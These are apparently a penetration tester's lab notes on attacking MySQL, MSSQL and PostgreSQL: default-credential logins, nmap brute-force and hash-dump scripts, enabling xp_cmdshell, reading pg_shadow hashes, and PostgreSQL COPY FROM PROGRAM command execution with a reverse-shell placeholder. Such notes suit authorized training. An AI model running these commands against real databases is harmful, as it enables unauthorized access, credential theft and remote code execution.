# MySQL
```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306 #此处-p<passwd>间无空格！
select system_user(); # database(),@@version();
\! sh #并不能使用mysql用户
```
[MySQL_CheatSheets](https://devhints.io/mysql)
# MSSQL
```bash
#master、tempdb、model和msdb -> default dbs
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth -port <port>

SELECT @@version;
SELECT name FROM sys.databases; 

SELECT * FROM offsec.information_schema.tables; 
select * from offsec.dbo.users;
```
## Enumeration/BruteForce
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
#同一用户名错误猜测多次可能会被封禁

msf> use auxiliary/scanner/mssql/mssql_ping
```
## RCE
```bash
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
# RCE ！ 
EXECUTE xp_cmdshell 'whoami';
```
# PostgreSQL
```bash
# Default creds: postgres:postgres
psql -U <username>
psql -h <host> -p <port> -U <username> -W <password> <database>

\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles
SELECT schema_name,schema_owner FROM information_schema.schemata;
SELECT usename, passwd from pg_shadow;
```
## RCE
Since version 9.3, only super users and member of the group 
pg_execute_server_program
 can use copy for RCE
 [squid22](https://github.com/squid22/PostgreSQL_RCE.git)
```bash
## RCE
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\';
# tie up
git clone https://github.com/squid22/PostgreSQL_RCE.git
```
